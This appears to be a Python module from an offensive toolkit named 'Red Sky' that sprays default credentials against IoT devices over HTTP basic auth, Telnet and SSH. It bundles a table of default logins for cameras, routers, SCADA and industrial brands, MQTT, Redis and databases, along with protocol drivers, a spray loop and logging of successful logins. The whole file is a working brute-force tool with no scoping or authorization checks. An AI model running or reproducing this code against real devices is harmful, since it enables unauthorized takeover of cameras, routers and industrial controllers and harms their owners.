# language: Python, file: Program/iot/default_creds.py, target: Red Sky IoT — default credential spray
# Given a target list (ip:port) and a protocol, iterate a curated default-
# credential list against the target. Bundled creds are the union of
# well-published IoT vendor defaults. HTTP(S) forms, basic-auth, Telnet,
# SSH. Structured so `redsky iot scan` can feed the candidate list.
#
# The credential table lives in program/iot/data/default_creds.json — this
# file owns the loader, the protocol drivers, and the spray loop.

import base64
import json
import socket
import ssl
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


IOT_DIR = OUTPUT_DIR / "iot"
IOT_HITS = IOT_DIR / "creds_hits.jsonl"


# Built-in fallback table — the loader merges this with data file if present.
BUILTIN_CREDS: List[Dict[str, str]] = [
    # vendor, username, password
    {"vendor": "generic",     "user": "admin", "pass": "admin"},
    {"vendor": "generic",     "user": "admin", "pass": "password"},
    {"vendor": "generic",     "user": "admin", "pass": "1234"},
    {"vendor": "generic",     "user": "admin", "pass": "12345"},
    {"vendor": "generic",     "user": "admin", "pass": "123456"},
    {"vendor": "generic",     "user": "root",  "pass": "root"},
    {"vendor": "generic",     "user": "root",  "pass": "toor"},
    {"vendor": "generic",     "user": "user",  "pass": "user"},
    {"vendor": "generic",     "user": "guest", "pass": "guest"},
    {"vendor": "generic",     "user": "admin", "pass": ""},
    {"vendor": "generic",     "user": "root",  "pass": ""},
    {"vendor": "generic",     "user": "admin", "pass": "pass"},
    {"vendor": "generic",     "user": "admin", "pass": "admin123"},
    {"vendor": "generic",     "user": "admin", "pass": "administrator"},
    {"vendor": "generic",     "user": "support", "pass": "support"},

    {"vendor": "hikvision",   "user": "admin", "pass": "12345"},
    {"vendor": "dahua",       "user": "admin", "pass": "admin"},
    {"vendor": "dlink",       "user": "admin", "pass": ""},
    {"vendor": "dlink",       "user": "admin", "pass": "admin"},
    {"vendor": "dlink",       "user": "root",  "pass": "root"},
    {"vendor": "tp-link",     "user": "admin", "pass": "admin"},
    {"vendor": "netgear",     "user": "admin", "pass": "password"},
    {"vendor": "netgear",     "user": "admin", "pass": "admin"},
    {"vendor": "linksys",     "user": "admin", "pass": "admin"},
    {"vendor": "linksys",     "user": "admin", "pass": "password"},
    {"vendor": "asus",        "user": "admin", "pass": "admin"},
    {"vendor": "ubiquiti",    "user": "ubnt",  "pass": "ubnt"},
    {"vendor": "ubiquiti",    "user": "admin", "pass": "admin"},
    {"vendor": "mikrotik",    "user": "admin", "pass": ""},
    {"vendor": "mikrotik",    "user": "admin", "pass": "admin"},
    {"vendor": "cisco",       "user": "cisco", "pass": "cisco"},
    {"vendor": "cisco",       "user": "admin", "pass": "admin"},
    {"vendor": "axis",        "user": "root",  "pass": "pass"},
    {"vendor": "axis",        "user": "root",  "pass": "root"},
    {"vendor": "foscam",      "user": "admin", "pass": ""},
    {"vendor": "foscam",      "user": "admin", "pass": "admin"},
    {"vendor": "reolink",     "user": "admin", "pass": ""},
    {"vendor": "wyze",        "user": "admin", "pass": ""},
    {"vendor": "mobotix",     "user": "admin", "pass": "meinsm"},
    {"vendor": "mobotix",     "user": "root",  "pass": "meinsm"},
    {"vendor": "zyxel",       "user": "admin", "pass": "1234"},
    {"vendor": "zyxel",       "user": "admin", "pass": "admin"},
    {"vendor": "tenda",       "user": "admin", "pass": "admin"},
    {"vendor": "tenvis",      "user": "admin", "pass": "admin"},
    {"vendor": "sunell",      "user": "admin", "pass": "admin"},
    {"vendor": "vivotek",     "user": "root",  "pass": ""},
    {"vendor": "geutebruck",  "user": "admin", "pass": "admin"},
    {"vendor": "honeywell",   "user": "admin", "pass": "1234"},
    {"vendor": "scada",       "user": "pi",    "pass": "raspberry"},
    {"vendor": "siemens",     "user": "admin", "pass": "admin"},
    {"vendor": "rockwell",    "user": "admin", "pass": "admin"},
    {"vendor": "schneider",   "user": "USER",  "pass": "USER"},
    {"vendor": "mqtt",        "user": "admin", "pass": "admin"},
    {"vendor": "mqtt",        "user": "guest", "pass": "guest"},
    {"vendor": "mqtt",        "user": "mosquitto", "pass": ""},
    {"vendor": "redis",       "user": "",      "pass": ""},
    {"vendor": "redis",       "user": "default", "pass": ""},
    {"vendor": "mysql",       "user": "root",  "pass": ""},
    {"vendor": "mysql",       "user": "root",  "pass": "root"},
    {"vendor": "postgres",    "user": "postgres", "pass": "postgres"},
]


def load_creds() -> List[Dict[str, str]]:
    p = Path(__file__).parent / "data" / "default_creds.json"
    if p.exists():
        try:
            extra = json.loads(p.read_text())
            if isinstance(extra, list):
                return BUILTIN_CREDS + extra
        except Exception:
            pass
    return BUILTIN_CREDS


# ── http basic / form auth ──────────────────────────────────────────────────

def _http_basic_check(host: str, port: int, tls: bool, user: str, pw: str,
                      path: str = "/", timeout: int = 6) -> bool:
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        s = raw
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(raw, server_hostname=host)
        creds = base64.b64encode((user + ":" + pw).encode()).decode()
        req = (
            "GET " + path + " HTTP/1.1\r\n"
            "Host: " + host + "\r\n"
            "Authorization: Basic " + creds + "\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Connection: close\r\n\r\n"
        )
        s.sendall(req.encode())
        resp = b""
        s.settimeout(timeout)
        try:
            while len(resp) < 4096:
                chunk = s.recv(1024)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        head = resp.split(b"\r\n", 1)[0].decode("latin-1", errors="replace")
        # 200/302 OK = creds likely valid; 401 = rejected
        parts = head.split(" ")
        if len(parts) >= 2 and parts[1].startswith(("2", "3")):
            # double-check no WWW-Authenticate on success response
            if b"WWW-Authenticate" not in resp[:2048]:
                return True
        return False
    except Exception:
        return False


# ── telnet (minimal) ────────────────────────────────────────────────────────

def _telnet_check(host: str, port: int, user: str, pw: str, timeout: int = 6) -> bool:
    """Connect, wait for login prompt, send user / password, look for shell prompts."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except Exception:
        return False
    try:
        s.settimeout(timeout)
        banner = b""
        try:
            banner = s.recv(2048)
        except socket.timeout:
            pass
        if b"login" not in banner.lower() and b"username" not in banner.lower():
            # some telnet servers only prompt after we push something
            s.sendall(b"\r\n")
            try:
                banner += s.recv(2048)
            except socket.timeout:
                pass
        if b"login" not in banner.lower() and b"username" not in banner.lower() and b"password" not in banner.lower():
            s.close()
            return False
        if b"login" in banner.lower() or b"username" in banner.lower():
            s.sendall((user + "\r\n").encode())
            time.sleep(0.4)
            try:
                s.recv(2048)
            except socket.timeout:
                pass
        s.sendall((pw + "\r\n").encode())
        time.sleep(0.6)
        try:
            resp = s.recv(4096)
        except socket.timeout:
            resp = b""
        s.close()
        low = resp.lower()
        # success markers
        for m in (b"#", b"$", b">", b"welcome", b"busybox"):
            if m in low:
                # deny markers override
                if b"incorrect" in low or b"denied" in low or b"fail" in low:
                    return False
                return True
        if b"incorrect" in low or b"denied" in low:
            return False
        return False
    except Exception:
        return False


# ── ssh (paramiko if available) ─────────────────────────────────────────────

def _ssh_check(host: str, port: int, user: str, pw: str, timeout: int = 6) -> bool:
    try:
        import paramiko  # type: ignore
    except ImportError:
        return False
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cli.connect(hostname=host, port=port, username=user, password=pw,
                    timeout=timeout, allow_agent=False, look_for_keys=False,
                    banner_timeout=timeout, auth_timeout=timeout)
        cli.close()
        return True
    except Exception:
        return False


# ── spray ───────────────────────────────────────────────────────────────────

def _log_hit(hit: Dict) -> None:
    IOT_DIR.mkdir(parents=True, exist_ok=True)
    with IOT_HITS.open("a") as f:
        f.write(json.dumps(hit) + "\n")


def cmd_spray(targets: List[str], protocol: str, path: str, stop_first: bool,
              delay_ms: int) -> int:
    if not targets:
        print_err("no targets — pass --targets file or --host ip:port")
        return 1

    creds = load_creds()
    print_info("iot default creds spray")
    print_kv("protocol", protocol)
    print_kv("targets", len(targets))
    print_kv("cred combos", len(creds))
    print_kv("path", path)
    print()

    hits = 0
    for tgt in targets:
        host, _, port_s = tgt.partition(":")
        if protocol in ("http", "https"):
            port = int(port_s) if port_s else (443 if protocol == "https" else 80)
            tls = protocol == "https"
            checker = lambda u, p: _http_basic_check(host, port, tls, u, p, path)
        elif protocol == "telnet":
            port = int(port_s) if port_s else 23
            checker = lambda u, p: _telnet_check(host, port, u, p)
        elif protocol == "ssh":
            port = int(port_s) if port_s else 22
            checker = lambda u, p: _ssh_check(host, port, u, p)
        else:
            print_err("unsupported protocol: " + protocol)
            return 2

        print(BOLD + host + ":" + str(port) + RESET)
        hit_here = False
        for c in creds:
            u, p = c["user"], c["pass"]
            ok = checker(u, p)
            mark = SCARLET + "HIT" + RESET if ok else ASH + "no " + RESET
            print("  " + mark + " " + c["vendor"].ljust(10) + " " + u.ljust(10) + "/" + p)
            if ok:
                hit_here = True
                hits += 1
                _log_hit({
                    "ts": int(time.time()), "host": host, "port": port,
                    "protocol": protocol, "vendor": c["vendor"],
                    "user": u, "pass": p,
                })
                if stop_first:
                    break
            if delay_ms:
                time.sleep(delay_ms / 1000.0)
        if hit_here and stop_first:
            print("  " + SCARLET + "-> stopping on first hit for this host" + RESET)
        print()

    print_kv("total hits", hits)
    print_kv("hits file", IOT_HITS)
    return 0


# ── cli ─────────────────────────────────────────────────────────────────────

def run_cli(args):
    import argparse
    sub = args[0] if args else "help"
    rest = args[1:] if args else []

    if sub in ("-h", "--help", "help"):
        print_info("redsky iot default_creds <sub-command>")
        print_info("")
        print_info("  spray --host ip:port [--host ...] | --targets FILE")
        print_info("        --protocol http|https|telnet|ssh")
        print_info("        [--path /] [--first] [--delay-ms 100]")
        print_info("      iterate default creds, log hits to Output/iot/creds_hits.jsonl")
        print_info("  list")
        print_info("      show the built-in default cred table")
        return 0

    if sub == "list":
        creds = load_creds()
        print_info("default cred table: " + str(len(creds)) + " entries")
        for c in creds:
            print("  " + ASH + c["vendor"].ljust(12) + RESET + " "
                  + BONE + c["user"] + RESET + " / " + BONE + (c["pass"] or "(empty)") + RESET)
        return 0

    if sub == "spray":
        p = argparse.ArgumentParser(prog="redsky iot default_creds spray", add_help=False)
        p.add_argument("--host", action="append", default=[], help="ip[:port] (repeatable)")
        p.add_argument("--targets", default="", help="file with one ip[:port] per line")
        p.add_argument("--protocol", default="http", choices=["http", "https", "telnet", "ssh"])
        p.add_argument("--path", default="/")
        p.add_argument("--first", action="store_true", help="stop on first hit per host")
        p.add_argument("--delay-ms", type=int, default=0)
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky iot default_creds spray --host ip:port --protocol http [--first]")
            return 2

        targets = list(ns.host)
        if ns.targets:
            tp = Path(ns.targets)
            if not tp.exists():
                print_err("targets file missing: " + ns.targets)
                return 1
            for line in tp.read_text().splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)

        return cmd_spray(targets, ns.protocol, ns.path, ns.first, ns.delay_ms)

    print_err("unknown default_creds sub-command: " + sub)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
